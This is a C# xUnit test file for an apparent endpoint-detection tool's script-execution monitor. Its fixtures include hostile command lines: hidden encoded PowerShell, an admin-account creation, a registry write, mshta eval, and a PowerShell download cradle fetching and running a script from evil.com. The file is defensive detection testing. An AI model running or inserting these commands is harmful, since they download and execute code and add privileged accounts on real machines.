using Xunit;
using Sentinel.Core;

namespace Sentinel.Tests
{
    /// <summary>
    /// Tests for ScriptExecutionMonitor - verifies detection model behavior
    /// for PowerShell, cmd, wscript/cscript, and mshta execution patterns.
    /// </summary>
    public class ScriptExecutionMonitorTests
    {
        // 
        // Script interpreter detection categorization
        // 

        [Theory]
        [InlineData("PowerShell AMSI Bypass")]
        [InlineData("ETW Tampering: Script Logging Disabled")]
        public void ScriptRules_CategorizedCorrectly(string ruleName)
        {
            var category = ScoringEngine.CategorizeDetection(ruleName);
            // Script execution rules should not be Unknown
            Assert.NotEqual(DetectionCategory.Unknown, category);
        }

        // 
        // Command line pattern detection
        // 

        [Theory]
        [InlineData(@"powershell.exe -nop -w hidden -enc SQBFAFG=")]
        [InlineData(@"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand dABlAH")]
        public void EncodedCommand_Patterns_AreHighRisk(string cmdLine)
        {
            // Encoded commands are evasion indicators
            Assert.Contains("enc", cmdLine.ToLowerInvariant());
        }

        [Theory]
        [InlineData(@"cmd.exe /c ""net user admin P@ss123 /add""")]
        [InlineData(@"cmd.exe /c ""reg add HKLM\SOFTWARE\malware""")]
        public void CmdExe_SuspiciousCommands(string cmdLine)
        {
            Assert.StartsWith("cmd.exe", cmdLine);
            Assert.Contains("/c", cmdLine);
        }

        [Theory]
        [InlineData(@"wscript.exe C:\Users\victim\Downloads\invoice.vbs")]
        [InlineData(@"cscript.exe //nologo C:\Temp\payload.js")]
        [InlineData(@"mshta.exe javascript:void(eval('payload'))")]
        public void ScriptHosts_SuspiciousPaths(string cmdLine)
        {
            // Script hosts executing from Downloads/Temp are suspicious
            bool hasScriptHost = cmdLine.StartsWith("wscript") ||
                                cmdLine.StartsWith("cscript") ||
                                cmdLine.StartsWith("mshta");
            Assert.True(hasScriptHost);
        }

        // 
        // Detection event model
        // 

        [Fact]
        public void ScriptExecution_DownloadCradle_HighConfidence()
        {
            var detection = new DetectionEvent
            {
                RuleName = "Script Execution: Download Cradle Detected",
                ProcessId = 9000,
                ProcessName = "powershell.exe",
                Confidence = 0.85,
                Tier = DetectionTier.Tier1Behavioral,
                AuthorizedResponse = ResponseAction.KillProcessTree,
                Evidence = "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')"
            };

            Assert.True(detection.KillAuthorized);
            Assert.True(detection.Confidence >= 0.85);
        }

        [Fact]
        public void ScriptExecution_ObfuscatedScript_Tier1()
        {
            var detection = new DetectionEvent
            {
                RuleName = "Script Execution: Heavily Obfuscated Script (Score 8/10)",
                ProcessId = 9001,
                ProcessName = "powershell.exe",
                Confidence = 0.92,
                Tier = DetectionTier.Tier1Behavioral,
                AuthorizedResponse = ResponseAction.KillProcessTree
            };

            Assert.Equal(DetectionTier.Tier1Behavioral, detection.Tier);
        }

        [Fact]
        public void ScriptExecution_LowObfuscation_Tier2()
        {
            // Low obfuscation score should be observe-only
            var detection = new DetectionEvent
            {
                RuleName = "Script Execution: Minor Obfuscation Detected (Score 2/10)",
                ProcessId = 9002,
                ProcessName = "powershell.exe",
                Confidence = 0.45,
                Tier = DetectionTier.Tier2Indicator,
                AuthorizedResponse = ResponseAction.LogOnly
            };

            Assert.False(detection.KillAuthorized);
            Assert.Equal(DetectionTier.Tier2Indicator, detection.Tier);
        }
    }
}
